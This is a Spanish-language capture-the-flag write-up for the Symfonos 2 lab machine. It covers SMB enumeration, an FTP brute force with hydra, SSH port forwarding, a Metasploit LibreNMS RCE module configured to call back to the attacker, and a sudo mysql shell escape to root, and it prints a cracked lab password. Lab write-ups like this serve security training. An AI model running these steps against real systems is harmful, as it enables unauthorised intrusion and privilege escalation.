# Symfonos 2

**Sistema Operativo**: Linux

**Dificultad**: Media

**Técnicas Vistas**: FTP Exploitation - Abusing SITE CPFR/CPTO
Abusing FTP & SMB - Obtaining files from the machine
SSH Connection via Proxychains
SSH + Local Port Forwarding in order to access internal LibreNMS
LibreNMS Exploitation [RCE]
Abusing sudoers privilege (mysql) [Privilege Escalation]

Te prepara para las **Certificaciones**: eWPT / eJPT / eCPPTv2 / eCPTXv2<br><br>

![image](https://github.com/user-attachments/assets/717610e3-bcdd-4bb9-9a1e-1cea0a7f9290)<br><br>


## Reconocimiento

Encontramos la IP con `arp-scan`<br>

![image](https://github.com/user-attachments/assets/b8b7d32d-925a-4aa1-885b-0dfc9ee7f82a)<br>


- `-I eth0` -> Mi interfaz grafica.
- `--localnet` -> Red local.
- `--ignoredups` -> Que ignore duplicados.<br><br>

![image](https://github.com/user-attachments/assets/6978b75a-0561-494d-bf04-924c15ae0035)<br>

## SMB

Utilizando `smbmap` podemos listar los recursos compartidos y vemos una carpeta "anonymous" que podemos leer.<br>

![image](https://github.com/user-attachments/assets/cecdfb36-ec8f-49b7-bc93-9428da0c1fe4)<br><br>


Encontramos un "log.txt"<br>

![image](https://github.com/user-attachments/assets/1510bf73-9ea7-4708-a584-1096c30fbd9c)<br><br>


Descargamos el "log.txt"<br>

![image](https://github.com/user-attachments/assets/41c52a38-f449-4fb9-9c8c-bbc117e1e7b1)<br><br>

Encontramos un usuario: `aeolus`<br>

![image](https://github.com/user-attachments/assets/fa137cc4-4d32-4437-8868-26bd834fe089)<br>

## Ataque de fuerza bruta FTP

Utilizando `hydra` encontramos la contraseña del usuario "aeolus"<br>

![image](https://github.com/user-attachments/assets/92ac35c1-ec06-4a7f-b058-e368a66e0678)<br>

- `-l` -> El usuario
- `-P` -> La ruta del diccionario para hacer fuerza bruta
- `ftp://192.168.0.43` -> El protocolo, junto con la IP<br><br>


## Escalada de privilegios

Haciendo `cat /proc/net/tcp`, luego `echo $((0x1F90))` descubrimos el puerto "8080"<br>

![image](https://github.com/user-attachments/assets/5f72a1b9-4eea-4adb-9443-98a40813d261)<br>

Si le hacemos un `curl -s -X GET http://localhost:8080`, vemos un panel de login.<br>

![image](https://github.com/user-attachments/assets/860992e5-1dd7-4212-a414-5d20c6bbdaa3)<br><br>

Aplicamos port forwarding en nuestro maquina de atacante `ssh -L 5000:localhost:8080 aeolus@192.168.0.18`, esto quiere decir que el puertos "5000" de nuestra maquina se convierta en el puerto "8080" de la maquina victima.<br><br>

![image](https://github.com/user-attachments/assets/9e76d8ae-e6ce-4ef8-9510-a31c22987b9a)<br><br>

```
msfconsole

search librenms

1

use 1 -> Elegimos el script a utilizar

set PASSWORD sergioteamo
set USERNAME aeolus
set LHOST 192.168.0.162 -> mi IP
set LPORT 6000
set RHOSTS 127.0.0.1 -> port forwarding
set RPORT 5000 -> port forwarding

show options -> Comprobar si todo esta bien

run -> lanzamos el script

```
<br><br>
##### Somos el usuario cronus

![image](https://github.com/user-attachments/assets/83bc6d16-911b-4d34-a264-b445da58c9ca)<br>


Con `sudo -l` vemos que no necesitamos proporcionar contraseña para utilizar "mysql", en la pagina "https://gtfobins.github.io/gtfobins/mysql/", nos proporciona el comando `sudo mysql -e '\! /bin/sh' ` que nos convierte en root.<br><br>

![image](https://github.com/user-attachments/assets/d173afe1-d9ba-40eb-91ea-6b9cd18e1611)<br><br>


##### Flag

![image](https://github.com/user-attachments/assets/d2646498-e528-4e2e-ab6a-fc837ebed3c3)<br>

